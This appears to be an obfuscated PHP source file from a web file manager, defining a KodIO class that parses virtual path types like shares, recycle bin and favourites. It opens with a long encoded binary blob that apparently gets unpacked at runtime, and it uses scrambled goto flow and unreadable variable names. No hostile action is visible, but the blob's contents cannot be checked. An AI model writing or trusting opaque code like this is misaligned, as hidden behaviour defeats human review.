0\xf\x30\xca\x2c\x6a\x10\x81\x74\x7a\xa1\xb3\x3\x81\x3c\xd2\xec\x14\xdc\x66\xc6\x81\x81\xc4\x92\xb0\x47\xb4\x24\x4\x1d\x1\xd7\x27\x78\xd1\xe\x7b\x15\x76\x4c\x1c\x6a\x1d\xa1\x49\x83\xbb\xc6\x92\xce\x72\xa5\x14\x93\x5c".base64_decode('xyI4rF3CDdcdZ0LVFeSfBma2oZX9KFWeQo4SBFeGBWEWK4LhMzfajjHjClAkuq+zDTSJhloriKUh')."\235\27\220\31\126\264\141\276\327\22\152\126\306\341\240\202\46\267\5\320\53\335\175\232\211\264\247\132\334\142\32\100\44\152\272\155\154\270\40\6\5\242\342\140\253\121\125\332\254\104\13\367\353\315\22\173\142"."\235\123\154\301\114\22\202\135\54\353\23\315\122\231\247\332\63\145\365\342\115\124\42\141\142\275\341\262\223\26\232\111\201\252\265\316\231\325\130\133\353\310\26\14\323\251\53\326\47\163\141\107\111\344\374\260\67"."\xe4\xc4\x13\xdb\xb9\x58\x5\xfc\xa0\x93\x1a\x78\x23\x87\x9\xcd\x12\x99\x8\xe\x89\xce\xf\x1c\xea\xf7\x84\x3b\x7a\x1c\x12\x22\x56\x87\xd4\xed\xd\x3\xf0\x0\xf8\x7\x5b\x25\x38\x24\x38\xaf\x41\x32\x98\xe7\xe\x9\x9a\x57\x3b".base64_decode('pIE+/Mv1zEHfYbJA9kCoK0EcUjQlGjeJkiQ4Y6GWDel1DKAjmm0eVHMN9VDNHFs8wX06IQbAHQt6')."\256\31\273\162\62\234\131\65\16\126\165\260\242\72\1\111\64\103\125\76\153\31\364\42\363\377\137\2\254\5\325\165\377\377\227\2\165\44\74\46\130\144\142\5\123\61\376\247\62\50\203\143\135\205\265\223\332"."\xc8\xaa\x50\x27\xd5\xd7\xd6\x4a\x81\x45\x10\x8d\xa4\x4c\x13\x72\xd1\x4e\x26\xbc\x0\x8f\xf\x59\xa5\xb1\x5e\x46\x42\x2e\xd2\x47\x79\xd3\x70\x92\xa9\xb9\x3c\x75\x6d\x89\x18\x15\x18\xf8\xe0\x60\x90\xf9\xb1\xd3\xac\xcb\x41\xd8\xc2"."\xad\x49\xc3\x12\x94\x53\x93\xd1\x86\x6a\xfa\x9\xb8\xc9\x0\x79\x27\x58\x3b\xe0\xda\x5e\x54\x60\x1a\xed\x2c\x8c\x89\x59\x59\xa2\x19\x7d\x5\x73\x31\x6\xb6\x20\x82\x2\x31\x26\x98\xe4\x99\x82\x1\xa\xe3\xd8\x38\x8d\xa1\x27\xe0".base64_decode('OtSm5uAbvibibRjCELSxnEInPcwPTQLdCOjmjBnmw4gsH3EF2ubDRSsQhcKsrYIGYG10Vmh5ebSg').base64_decode('MHizbZawNqNMjAxsPUaxLF3LyAUXCd/Mc4bRNzgDyuEVolmC3qedgJ8US1hyCS3AAZ2SJ065iH/v').strrev('\\$£JL"ôhä.!ÂπáÃI⁄¶Æ⁄¯%Fƒèªÿ∞üa∞jV%GPy„Ω8ó'."\r".'àä¬Èyïä ').base64_decode('BPMB+oBN1NkB9RRbSybhcQSJESy0n6RZ8GaRxvIZOacYNAayioLtYjHjYmtGhkqThbN1sepRbFdJ')."\40\343\321\274\222\301\207\45\310\342\215\302\47\246\200\307\63\72\164\26\227\20\343\152\26\136\61\312\254\222\72\20\331\1\67\32\241\70\51\135\121\162\26\110\54\123\120\54\0\71\223\117\313\10\202\1\344"."\251\215\216\230\273\43\345\356\320\335\35\144\253\115\336\145\333\221\44\223\125\213\270\301\242\17\164\240\6\342\235\64\364\251\223\122\223\145\341\360\152\256\154\102\236\112\165\143\134\143\47\55\350\322\10\350\360".base64_decode('shrdSQgpQc1kays3TkJJyQzV6PL1dke7/L7+KBLxA31hj9+WAHhm2NdRAm4PUBe9tlrHslaNMzWH')."\x96\xf9\x7e\xee\x1d\x8\x44\x65\x83\xb9\xa8\x25\x9e\x1f\x49\x1e\x68\x1a\x80\x83\xf3\x5a\x62\xba\x9b\x5a\x54\xc6\x84\xd\x8f\x91\x95\x33\x4c\xa1\xc9\x4d\xd5\xd5\xdd\x46\x81\x88\x8\xc4\xa3\x8c\xdf\x47\xe6\x8e\x9b\xec\xef\xfc\x6a"."\214\32\54\165\370\227\201\46\100\307\37\201\240\47\270\224\73\60\6\51\141\117\160\212\24\230\207\370\374\243\156\350\346\55\130\260\200\276\304\32\317\140\23\114\150\42\300\356\313\1\24\236\76\51\245\120\271"."\24\23\152\340\41\273\45\313\175\173\120\326\75\270\5\145\22\227\251\371\51\22\325\74\175\107\63\117\265\324\363\5\172\231\315\216\323\4\67\77\263\311\357\70\371\215\115\22\262\226\165\242\73\20\227\111\176".base64_decode('1SDnY6lJqPpGw2ClyfBzTKRTPCx1yLlKUwoAtHlSLzRWyqWkSdBy7JTa4M5CjLSSyUShyhupbjyt').strrev('îÁ¿Q«@J∫îh‰$V&`£–<J"Â–hƒ◊sˆ‹,ôëRdÇ†ûdæ®^'."\r".'˝Nç$'."\r".'ˆI')."\x50\x52\x92\xe0\xd2\x82\xac\x20\x2c\xee\x6f\x16\x69\x9\x32\x6c\xcd\xd8\xe7\x4d\x42\x19\x9f\x27\x21\x87\x4e\xc4\xb5\x78\x79\x1f\x4a\xe8\x33\x12\xf8\xc\x34\x7\x93\xb0\x21\xaf\x45\x41\x10\x23\x94\x40\x9a\x2d\x7a\x86\x38\xa1\xb4"."\xc2\x33\x6a\xeb\x6a\x5\x8b\xe\x5f\x87\x37\x14\x5d\x18\x82\xae\x4d\xfd\x3e\xea\x4e\xc7\x9a\xe0\x3\x69\xe1\xe0\x14\x29\x9e\xe0\x54\x29\x81\xf6\x85\x53\xa4\x74\xd0\xfd\x83\x35\xc5\x1f\x8\x84\x44\xcf\x4d\xb6\xea\xd\xf4\xb\xfe"."\x1c\xc9\xfe\x18\xae\xdd\x75\x44\xe9\xb3\x6f\xc0\x4f\xf8\x57\x84\x50\x70\x84\xf0\xe2\xe\xa2\xde\x14\x29\xcc\xa8\x6d\xa4\xc6\x3e\xfc\x65\x51\xd8\x37\x51\xe1\xfd\x6f\x7c\x64\x86\xc3\x1a\xda\xa1\xe1\xb0\x14\x97\xb1\x51\x4c\x4c\xc1"."\122\201\222\200\276\134\141\355\44\3\310\312\224\223\117\207\216\232\335\356\52\327\314\352\303\246\147\105\130\244\6\2\43\65\356\351\3\244\32\323\71\14\40\34\306\340\356\43\253\52\126\125\126\273\152\252\42"."\165\325\114\175\53\102\55\311\42\221\2\121\176\32\136\331\270\232\273\215\214\14\271\152\42\303\207\11\332\144\53\1\140\65\3\214\245\351\171\30\362\160\301\260\214\232\252\241\212\312\141\127\315\320\221\221\310"."\60\14\126\3\130\63\204\107\102\256\232\152\307\374\303\334\3\252\41\342\143\347\327\123\342\220\56\247\266\144\171\166\270\17\105\26\25\354\222\220\45\205\250\117\333\357\5\114\131\360\206\147\146\363\2\331\102"."\x97\x48\xb3\x1a\x45\xc5\x74\xc\xa1\x4b\x4a\x81\xae\x7d\x28\x48\x8d\xb7\xf2\x5c\x41\xdf\xaa\x4c\xcb\xa2\x96\xd9\x52\x2b\xb5\x3\x51\xcd\x62\x35\x6d\x71\xd9\x27\xd4\x4e\x9f\x29\x14\x14\x15\xbd\x5e\x22\x88\xf8\xe0\xa\x8c\xb\xf"."\xd9\xa\x75\x5\xf2\x9a\xe0\xfc\x5\x16\x44\x9d\x23\x11\x41\x40\x36\xd2\x53\x78\xb\xc2\x8e\x3b\x40\x3\x84\x3a\x21\xd6\xe2\x82\x1b\x7e\x61\xa1\xed\xb1\x79\xd9\x22\xdb\xa8\xd2\x3e\xc4\x61\x40\xc8\x64\x6a\x21\x3c\xf0\x29\xb4\xaf"."\xa1\xfe\x4c\xb8\x4e\xf8\x58\x8c\xf4\x0\xec\xe3\xa8\xed\x83\xcc\x24\x3b\x23\x6c\x47\xb9\xe\xc\x92\x26\xb8\x16\x16\x8d\x52\x11\x29\x2e\xe7\xe1\x7d\x4d\x2\x9f\x8c\x83\x8e\x27\xdf\x66\xa1\x81\x7e\xe8\xdb\xe\x72\x82\x28\x3d\x43"."\25\100\276\76\137\64\344\133\346\55\111\200\156\234\313\247\200\365\76\354\243\342\217\0\357\13\40\167\162\26\370\100\337\242\276\300\140\71\324\160\157\77\227\45\204\244\16\117\137\70\52\354\111\361\146\5\154"."\271\330\156\205\52\254\307\365\170\103\175\214\115\63\346\146\215\312\362\144\246\320\65\237\273\122\30\167\62\375\175\272\337\351\344\36\120\110\66\164\360\112\252\200\374\301\220\14\342\51\216\230\354\220\312\236\341".base64_decode('sA0VMeSwHU/G1JxMHdFm6bezzBoOOoWijnSQ5RqVDMS76zy7ACTmYjpI1ZERt3BmlzODSkqM+jWm')."\xb3\x87\x56\xf3\x32\x45\xc0\x47\x8d\x4\x43\x13\xb8\x49\xf1\xc4\xcd\x82\xf8\x78\x92\xf0\x72\x3d\x88\x75\x73\x8f\xaa\x82\x99\x9e\xb3\x4e\x62\x2d\x8a\xe2\x92\x71\x64\xa6\x90\x80\x35\xc5\xcb\x98\xfa\xd9\x3c\x25\x20\xdb\x59\x3c\x79"."\x91\xd5\x78\xa8\x10\x63\xfe\x6e\x6c\xb6\x79\xd4\xdb\xab\x24\x5a\xc5\x51\x7f\xae\xb0\x0\xf4\xc2\xe\x6c\x81\x21\xa6\x81\x62\xe1\xc3\xd5\xbc\x65\x62\x16\xf4\xcd\x92\x2c\x38\xd\x1a\xaf\x71\x56\x26\xa6\x18\x50\x21\x6b\x80\x8a\x5d"."\xe5\x52\xca\x7c\xa\x25\x9\x3d\x1a\xa7\xfb\x38\xea\xae\x8e\x74\x12\xef\x2b\x93\xf6\x77\xbd\x93\x3e\x81\x27\x3a\x84\x25\xa6\x6f\xa4\x73\x9d\xf5\x92\x40\x5e\x90\xf7\x8\x14\x81\x4f\x23\x58\x37\x72\x63\xce\xc\xc7\xd1\xa0\x87\x7"."\x85\xf\x3e\x37\x16\xc4\xcf\xff\xb0\xa1\x45\xef\x4\xb1\x98\x2e\x18\x92\x29\x9\x3a\x74\xe8\x9d\x9d\xb2\x6b\x9\x6\xa2\x87\x78\x6\xca\xa5\xe3\xce\x82\xc9\x9d\x16\xcf\x9d\x36\x4\x30\xe5\xad\xe9\xe8\x8b\x62\x65\x92\xf8\xd1\x25"."\213\7\103\133\41\72\116\353\124\270\363\21\224\213\267\203\73\101\5\40\260\367\101\317\157\361\216\341\76\353\360\303\102\324\125\253\47\221\260\203\303\32\3\226\372\275\163\61\47\263\304\143\76\330\224\206\174"."\201\276\252\152\50\145\131\174\6\364\116\60\237\346\140\44\321\72\336\53\217\363\201\142\21\232\312\350\324\260\104\260\327\110\113\156\6\142\130\143\112\214\261\155\302\110\173\372\335\14\324\116\273\211\75\141\103"."\14\245\341\3\2\142\241\1\42\263\216\141\13\50\302\113\233\231\43\115\272\45\32\313\252\161\311\37\350\206\373\361\116\137\150\221\224\122\114\211\13\102\350\342\302\72\363\221\303\7\164\320\107\11\77\106\325"."\132\120\320\211\16\105\234\26\327\102\154\227\42\172\330\204\5\225\24\214\107\135\54\16\236\250\70\23\314\160\326\206\113\5\207\222\34\342\367\205\74\160\227\143\345\25\10\114\366\77\326\162\46\24\170\67\120"."\376\333\205\62\337\45\370\31\176\236\42\144\120\163\105\325\120\71\33\240\135\65\41\342\227\364\45\152\212\200\0\35\215\161\153\162\326\255\370\225\72\333\67\113\54\236\171\34\343\220\307\312\4\333\132\74\74"."\342\163\202\302\152\1\375\32\200\245\230\353\302\345\251\63\32\162\375\116\351\204\104\205\233\154\313\273\203\44\31\354\24\145\225\222\75\16\13\71\202\276\356\236\360\124\305\225\140\253\11\376\250\240\255\62\152"."\x82\x4a\x93\xcc\xd5\x37\x90\x21\x51\x79\x58\xab\xc7\x52\x27\xa8\xb8\xc0\xf9\x88\xaf\xd3\x81\xde\x58\xe3\xbe\x63\x51\x10\xc8\x9b\xe\x78\xfc\x85\x2a\xe0\x10\xde\xa\x44\x97\xc8\x64\x8a\xa9\x1a\x32\x70\x25\x76\x9d\x18\xe6\xb\x44"."\xf1\x3\x80\x38\xea\xb6\x8b\xd0\x49\x64\x2c\x8a\xac\x8f\x4\x57\x47\x6e\x7a\x24\xc9\x5c\x7f\xc3\x93\x69\x2f\x75\xbc\xe3\x32\x69\x8\x82\xb9\x65\x2a\xcc\x48\xdf\x17\xa3\x95\xc5\x51\xbb\x2b\xdc\xb4\x45\x86\x2e\xc5\x5\x69\x12\x37".base64_decode('vWcIUqtUizw4YH0bdP/TQh8IgI3H5tDojTVvNm9aTKV7VIM/9IHECL5dgrKZlp0oAVhs8f20Gsx7')."\52\64\63\311\45\65\261\145\210\175\171\1\233\160\240\20\66\301\166\300\223\154\263\37\21\201\137\51\52\326\354\123\226\145\330\371\76\343\331\26\46\211\42\2\35\41\373\124\301\121\76\375\205\56\160\230\374"."\x9\xab\x22\x8\x2a\xc4\xaa\x29\x42\x7e\x29\x3f\xb4\x17\xd\xc6\xa6\x83\x68\x8d\x50\x2\x84\xd1\x92\xc4\x5e\x85\xab\xa9\x91\xba\x3a\x38\x8b\xc7\xb7\xd5\x0\x84\x7d\xd\x81\x0\xa7\x68\x9a\x26\xc\x3f\x56\x57\xf\x62\x5f\x8d\x2e"."\xec\x18\x83\xca\x25\x29\x95\x39\x64\xb5\xa0\x11\x72\x7\x5b\x88\x29\x5d\xb8\x90\xb5\xe\xbb\x73\x29\xe4\x7c\xf8\xb9\x0\xb\x54\x17\xc4\x6f\xd1\x8f\x2f\x76\x5c\xc3\x3d\xb1\x13\x74\xf0\xb5\x7e\xec\xa9\x86\x4c\x48\xb1\x48\xea\x2d"."\x8\xfd\x40\x1\x1d\xd0\x2b\x33\x73\x76\x97\x7a\x17\x82\xbe\x24\x99\x28\xc1\x7d\xaf\x12\x57\x4f\x2e\x51\x3e\x26\x8\x52\x8b\x44\xe7\x8b\x61\x5a\xe8\x8\x8a\x1f\x40\x32\x71\xa0\x0\x22\x4e\x51\x88\x2a\xf\xb5\x10\x27\x42\x61\x3".strrev('¬‰d{≥‡w”;Éñ¬¬°˙ë¯jãëÉ£nlõÖ˙˘(¬`&–¢àáﬂ8¬^&I*t¸î{cdÇﬁÜ')."\231\3\357\16\112\366\51\205\177\20\326\60\54\176\334\42\325\331\5\72\326\113\266\14\101\173\117\206\265\122\277\13\334\235\122\256\220\345\176\253\100\304\52\340\142\321\237\172\254\370\236\346\26\364\214\3\251"."\xce\x3a\xe8\x33\x81\xe\xfc\xb4\xad\xc3\x52\x4\xaa\x50\xd4\x14\x1a\xcc\x24\x2b\xdb\x70\x95\x7c\xec\xbf\x28\x9d\x78\xea\x45\xc2\x2d\x10\x13\xb0\x23\xb\x9c\xd4\x8c\x2e\x3e\xca\xa3\xa9\x16\xba\x4\xbb\x4b\x7e\xa4\x8c\x5f\x1b\xcd"."\xdb\x19\xe5\xd2\x6c\xa2\xbe\xa1\x69\xae\xb8\x9f\xe4\xc3\xc8\xfd\xe3\xd0\xb7\xa0\xf1\xf\x3d\x3a\x63\x84\x21\x59\xe9\x4c\xa2\x4f\x9c\x8a\x33\x1b\x25\x5a\x1d\xe\x93\x47\x69\x5\x2e\x68\xe3\x5f\xff\xd5\x74\xf0\x94\x13\x3d\x71\x26"."\341\204\213\225\54\164\101\271\257\374\377\353\201\343\124\274\204\276\132\171\314\352\141\215\354\41\171\262\40\100\212\242\56\30\15\17\233\137\146\72\220\313\114\330\233\214\237\354\374\357\53\115\245\74\331\352\137"."\13\245\362\5\23\262\17\372\145\172\354\53\54\173\50\210\327\134\141\154\205\303\17\305\14\100\163\173\62\362\302\376\2\244\130\320\204\165\22\304\330\352\317\337\371\202\25\243\65\231\142\103\100\347\56\257\16"."\172\121\200\173\365\100\144\152\41\131\341\365\134\321\101\77\52\50\54\170\73\54\55\32\355\110\111\45\11\315\242\353\174\344\372\316\323\315\336\134\200\127\235\274\12\60\306\31\225\251\361\24\123\263\76\373\22"."\xa0\xe7\x7a\x60\x4b\x6b\x11\x6a\x41\x9c\xdb\x45\x9\x33\x2f\x61\x3\x8a\x52\x88\x30\x93\xc1\xc\x53\x5\xc1\x94\x48\x6c\x5c\x4\x42\xd\x15\x3c\x16\x91\x4d\x33\xef\x29\xf\x21\xeb\x84\x43\x7c\x33\x18\x44\x19\xd5\x91\x35\x85\xcc".base64_decode('feQOGX9WWEH4YsFDfdR0AEaEIyMkSLLEtChjwqepcIiKVawWiM+VmwC4EpD6yDKGgpS3Qt1iZNIL')."\xf3\x90\xde\xb3\xf2\xa\xd4\xa0\xef\x59\xb\x61\x71\xcc\x1d\xb7\xb0\xb0\x8a\xbc\x7b\xf\x31\x95\x90\x91\xc3\x12\x23\x11\x2e\xd1\x21\xb5\x6c\xe1\x8a\x9\xc5\x99\xa3\x55\xfa\xa8\x18\x7d\x6b\x4c\x66\xfe\x62\xa0\xa3\x1d\xb6\x8d\xc2"."\x47\x50\x4\x25\x93\xe1\xeb\x84\xf8\x10\x4c\x26\x26\xeb\x2e\x40\x4e\x23\x26\x75\x4c\x56\x2e\x22\xbe\x77\x50\x46\xfa\xa7\x12\x8\x6f\x40\x4e\x8d\x8f\x94\x71\x44\x4\x3b\x1b\xaa\xec\x8\x2c\x5a\x58\xd8\x4a\xd0\x38\xd7\x0\xeb\x1f".base64_decode('U7WjISQqQ5GIvIlueX0jwK6gq4kTu+EFdPbDKUfPscSJbwGVsIuwZa2wAMXuIUQA3d1TerDkgI6L')."\xda\x5\x99\x1b\x23\x19\x62\xdf\x5a\x8e\xdf\x4a\xfd\x52\x95\xe6\x66\x13\x50\xcc\xc2\x97\xb\x1c\x87\x2f\xde\x5b\x37\xb3\x62\xd1\xf8\xda\x18\x6e\xd8\x82\x70\x6f\xe5\xb2\x15\xcf\x66\x4c\xd9\x59\xa2\x1a\xf8\x38\x50\xdc\x77\x80\x90"."\x58\x51\x3a\xcd\xfa\x75\xd\xad\xfe\x56\x28\x5b\x3\x4\xf3\x25\x41\xb5\x28\x64\x67\x54\xb6\x23\x4a\x20\xac\xb\xc7\xf7\xf8\x55\x4e\xfc\x5c\x3a\x7c\x52\x10\xb0\x2b\x29\x34\xd0\x5b\x85\xfc\x96\x43\x0\xc\xe0\x97\xdd\x96\x13\x61"."\144\271\64\115\22\376\303\357\373\125\301\144\130\310\162\311\327\307\137\130\256\226\370\273\164\342\233\354\360\54\253\113\143\164\0\257\43\5\315\25\353\53\14\320\161\262\165\16\264\225\103\213\153\272\41\240\11"."\17\124\35\1\375\311\343\140\257\232\243\217\177\20\322\246\331\311\110\340\130\271\362\301\300\207\114\313\20\361\47\352\355\117\323\243\335\36\336\300\131\366\161\104\243\107\4\11\47\116\120\155\335\352\56\26\45"."\42\60\175\311\223\224\40\34\253\133\57\70\330\123\344\45\174\253\240\372\205\144\224\213\76\30\7\176\341\3\15\76\356\327\1\45\343\103\77\117\121\146\332\56\366\134\3\26\141\130\270\16\211\43\202\344\73"."\26\224\61\6\152\211\376\361\344\125\173\16\63\255\352\211\166\65\227\260\343\27\162\61\6\345\350\140\60\332\313\201\201\40\325\145\73\32\144\160\141\225\341\314\123\56\362\243\161\56\202\46\22\135\162\261\14"."\x2a\xb3\xc2\x66\x50\x0\x61\xa8\x48\xf2\x11\xde\x91\xe1\x7e\x86\x95\x31\xf1\xeb\x4\x2f\x59\xba\xc6\x40\xc4\x52\x28\x7f\x67\xc6\xde\x2e\x34\x8d\x18\x9c\xdc\x50\xe4\x4\x6f\x6d\x84\xdc\x38\x8\xe1\xc4\x99\x23\x3f\x5c\x14\xf4\xda"."\354\202\216\260\271\207\77\134\107\266\223\344\237\264\76\207\303\320\230\124\6\160\220\76\273\323\2\265\271\72\206\207\152\164\265\265\45\221\155\254\120\174\331\335\256\205\24\374\102\161\342\205\310\224\31\102\345".strrev('§ΩpÀ{bˆ≠ä¯¬McÕ8Z«EòóNªE°ˆ:•¢bÉ0F ﬁÛ•öj.Å<A”¬≈⁄’È¬?').base64_decode('SJ7yn7Z/gHaP/TqSFyJsXkruSsNamTy4RmWz4SSYk0ttlrzGmGrG02Xz4iSYtySZZhb24UI+Uy4Y')."\x53\x34\xaf\xb4\xf3\xd0\x34\xb2\x75\x1d\x69\x30\xf7\x47\x2e\xa0\x4e\xd5\x9f\x65\x91\x4b\x3f\x47\x88\xc7\x8e\x8d\xf6\xcf\xe5\x6b\x51\xf6\x1c\x60\xaa\x5a\x94\x45\x9e\xb2\x16\x1c\xdb\x76\x5\x5a\x8e\x1f\xd2\x94\x32\x1c\x90\xdf\x58"."\226\362\132\236\126\346\376\24\227\11\27\342\240\105\305\260\44\131\274\214\55\177\135\33\54\73\213\15\353\75\252\15\56\166\14\367\17\111\74\106\216\344\250\213\45\220\235\273\56\204\146\224\36\335\336\71\124".base64_decode('trM5A6a0lysIDmjLehN2wA1v6Y4yQx1wib6W8U5EM9W4oLcBgaK7YJxOP5LhR2NEEsDXbZ2iGvI7')."\167\36\267\355\336\353\267\255\277\162\333\31\307\157\71\363\2\307\326\123\256\335\172\311\111\133\57\131\273\345\344\53\267\134\170\3\116\330\172\351\232\355\27\236\61\117\332\172\322\157\141\342\171\47\274\175\337"."\x9d\xf8\xdf\x2d\xd7\xdc\xf3\xce\xfa\x7\xb7\x3d\xb0\x1e\xa3\x6c\xb9\xf5\x9e\x77\x6e\xbd\x76\xdb\x39\x37\x6c\x3d\xf1\xae\xad\xe7\x5f\xb1\xf5\xdc\x13\xf\x15\x3a\x5\xd4\x5b\xe7\x5e\x7\x2d\x57\x86\x65\xd2\x5d\xfc\x44\xd6\xe2\xf3"."\32\75\315\306\54\330\261\4\100\316\244\361\15\12\322\344\41\220\366\11\270\137\163\340\205\25\47\207\64\335\204\226\355\140\101\310\243\337\166\315\64\51\237\2\122\65\302\104\162\42\162\234\43\334\21\203\20"."\x7f\x97\x17\xe\x21\x3a\xe\x47\xc4\x8e\x98\x12\xa\x92\xbb\x1c\xb8\xb7\xd\x29\x38\x15\xb1\x32\x4b\x4\x1e\xb3\xb3\x48\xb0\xf4\x3c\xbd\xab\x60\xbb\x3c\xe2\x0\xb0\x2b\x8d\x69\xe3\x84\xd6\xd0\xab\x3a\xbc\x3e\xf0\x3c\x9c\x74\x8b".strrev(''."\n".'ƒª‘pÅ}L«G"ﬂÅêà‰	_~o\\……†OdçMLèS…8eDÓ¶¢n)∆·ôÍëºob*è‰]')."\x87\x4a\x92\xfa\x3d\xa1\xd0\x60\x20\xd8\x89\x55\x5d\x4b\x92\x51\x2e\x41\xbd\xa0\x24\xa9\xbf\x27\xd0\x37\x55\x9a\xb7\xd7\xe3\xf3\x97\xa4\x41\x75\x3\xa8\x80\x4b\x5f\x23\xc5\x49\xbe\x7e\x54\x4b\x8f\xdf\x4f\xf5\xdd\x4a\x6b\xe1\xeb"."\130\304\153\202\156\326\370\71\160\76\255\321\143\125\233\56\16\75\66\17\311\164\66\212\257\162\50\131\166\314\45\24\141\75\202\20\207\331\240\57\344\262\100\276\144\213\42\110\27\120\45\240\217\24\26\244\136".strrev('¨JΩH^ıÅÇ!-ÀZ”∂›Å÷«éÌ¨~àµ≈Å7ÒìG'."\0".'£À.áw‚7‘H5q0≥åÓS·%').base64_decode('0GLCxRFmgRbmJyp14LAlGfCWsBaWU4SXQGmGx9onxLB4VtLGWIkpp+hVvZ3LC3fTsJf+D4k03LCb')."\305\0\0"."", 10, -8))); goto Fâ®áâÚ”˘; EîŒ»ù©¡ú: class KodIO { const KOD_SOURCE = "\x7b\x73\157\165\x72\x63\145\175"; const KOD_USER_RECYCLE = "\x7b\x75\163\x65\x72\122\x65\x63\x79\x63\x6c\145\175"; const KOD_USER_FAV = "\173\165\x73\145\162\x46\141\166\175"; const KOD_USER_FILE_TAG = "\173\x75\x73\145\162\x46\x69\x6c\145\x54\x61\x67\175"; const KOD_USER_FILE_TYPE = "\173\x75\163\145\x72\x46\x69\x6c\x65\124\x79\160\x65\175"; const KOD_GROUP_ROOT_SELF = "\173\147\162\157\165\x70\x52\157\x6f\164\x53\145\x6c\x66\175"; const KOD_USER_SHARE = "\x7b\x75\x73\x65\x72\123\150\141\162\145\x7d"; const KOD_USER_SHARE_LINK = "\173\x75\163\145\162\123\x68\141\x72\x65\x4c\x69\x6e\153\175"; const KOD_USER_SHARE_TO_ME = "\173\x73\x68\x61\162\145\124\157\115\145\175"; const KOD_SHARE_ITEM = "\x7b\x73\150\141\162\145\111\x74\145\155\175"; const KOD_SHARE_LINK = "\x7b\163\150\141\x72\145\111\164\x65\155\x4c\151\156\153\x7d"; const KOD_SEARCH = "\173\x73\x65\141\162\x63\x68\x7d"; const KOD_BLOCK = "\173\x62\x6c\x6f\143\x6b\x7d"; const KOD_IO = "\173\x69\157\175"; const KOD_USER_RECENT = "\173\x75\x73\x65\x72\122\145\x6e\x63\145\156\x74\175"; const KOD_USER_DRIVER = "\173\x64\x72\151\166\145\x72\x7d"; public static function typeList() { $bÕêæÙêè¡ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; return array($bÕêæÙêè¡[1054] => self::KOD_SOURCE, $bÕêæÙêè¡[1055] => self::KOD_USER_RECYCLE, $bÕêæÙêè¡[1056] => self::KOD_USER_FAV, $bÕêæÙêè¡[1057] => self::KOD_USER_FILE_TAG, $bÕêæÙêè¡[1058] => self::KOD_USER_FILE_TYPE, $bÕêæÙêè¡[1059] => self::KOD_GROUP_ROOT_SELF, $bÕêæÙêè¡[1060] => self::KOD_USER_SHARE, $bÕêæÙêè¡[1061] => self::KOD_USER_SHARE_LINK, $bÕêæÙêè¡[1062] => self::KOD_USER_SHARE_TO_ME, $bÕêæÙêè¡[1063] => self::KOD_SHARE_ITEM, $bÕêæÙêè¡[1064] => self::KOD_SHARE_LINK, $bÕêæÙêè¡[1065] => self::KOD_SEARCH, $bÕêæÙêè¡[1066] => self::KOD_BLOCK, $bÕêæÙêè¡[1067] => self::KOD_IO, $bÕêæÙêè¡[1068] => self::KOD_USER_RECENT, $bÕêæÙêè¡[1069] => self::KOD_USER_DRIVER); } public static function parse($C¶äÑçøé“) { goto f«Û∑€Ö©÷; f«Û∑€Ö©÷: $Eê„ïÚ∏‚Ω =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $C¶äÑçøé“ = self::clear($C¶äÑçøé“); $bﬁ‚öŒ•‹ã = array_values(self::typeList()); goto Bß√ªâ”ºÏ; cƒ˜ÇÓ€Ã–: $cº∫‚Ì˘Éµ = array($Eê„ïÚ∏‚Ω[33], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $f∫≤ë»á∫Ó[$Eê„ïÚ∏‚Ω[1074]] = in_array($f∫≤ë»á∫Ó[$Eê„ïÚ∏‚Ω[29]], $cº∫‚Ì˘Éµ); return $f∫≤ë»á∫Ó; goto C›“ªﬂ≠µ…; Bß√ªâ”ºÏ: preg_match($Eê„ïÚ∏‚Ω[1070], $C¶äÑçøé“, $Dÿìß∂∑œß); $f∫≤ë»á∫Ó = array($Eê„ïÚ∏‚Ω[388] => !1, $Eê„ïÚ∏‚Ω[1071] => !1, $Eê„ïÚ∏‚Ω[385] => !1, $Eê„ïÚ∏‚Ω[75] => $C¶äÑçøé“, $Eê„ïÚ∏‚Ω[1017] => !1, $Eê„ïÚ∏‚Ω[1016] => $Eê„ïÚ∏‚Ω[33]); if (is_array($Dÿìß∂∑œß) && count($Dÿìß∂∑œß) == 5) { $Aâ¥ó∏≠Ù» = $Eê„ïÚ∏‚Ω[1072] . $Dÿìß∂∑œß[2] . $Eê„ïÚ∏‚Ω[315]; if (in_array($Aâ¥ó∏≠Ù», $bﬁ‚öŒ•‹ã)) { $f∫≤ë»á∫Ó[$Eê„ïÚ∏‚Ω[1017]] = $Dÿìß∂∑œß[1]; $f∫≤ë»á∫Ó[$Eê„ïÚ∏‚Ω[29]] = $Aâ¥ó∏≠Ù»; $f∫≤ë»á∫Ó[$Eê„ïÚ∏‚Ω[1073]] = substr($Aâ¥ó∏≠Ù», 1, -1); $f∫≤ë»á∫Ó[$Eê„ïÚ∏‚Ω[367]] = $Dÿìß∂∑œß[3]; } $f∫≤ë»á∫Ó[$Eê„ïÚ∏‚Ω[1016]] = $Dÿìß∂∑œß[4]; } goto cƒ˜ÇÓ€Ã–; C›“ªﬂ≠µ…: } public static function clear($Bôƒ ⁄•€Ò) { goto Aô’Ó’”ŒÁ; B¡’òè¬¿®: return $Bôƒ ⁄•€Ò; goto d⁄ú≤¶ó∑Ç; bºéùÏã°À: $Bôƒ ⁄•€Ò = preg_replace($bÊ∏µ∑¿èŒ[1077], $bÊ∏µ∑¿èŒ[8], $Bôƒ ⁄•€Ò); if ($Bôƒ ⁄•€Ò == $bÊ∏µ∑¿èŒ[8]) { return $bÊ∏µ∑¿èŒ[8]; } $Bôƒ ⁄•€Ò = rtrim($Bôƒ ⁄•€Ò, $bÊ∏µ∑¿èŒ[8]); goto B¡’òè¬¿®; Aô’Ó’”ŒÁ: $bÊ∏µ∑¿èŒ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $Bôƒ ⁄•€Ò = str_replace(array($bÊ∏µ∑¿èŒ[996], $bÊ∏µ∑¿èŒ[217]), $bÊ∏µ∑¿èŒ[50], $Bôƒ ⁄•€Ò); $Bôƒ ⁄•€Ò = str_replace($bÊ∏µ∑¿èŒ[93], $bÊ∏µ∑¿èŒ[8], $Bôƒ ⁄•€Ò); goto A≤≤◊çÊÊç; A≤≤◊çÊÊç: $dáüòØ√î = $bÊ∏µ∑¿èŒ[1075]; if (substr($Bôƒ ⁄•€Ò, 0, 3) == $bÊ∏µ∑¿èŒ[1076]) { $Bôƒ ⁄•€Ò = substr($Bôƒ ⁄•€Ò, 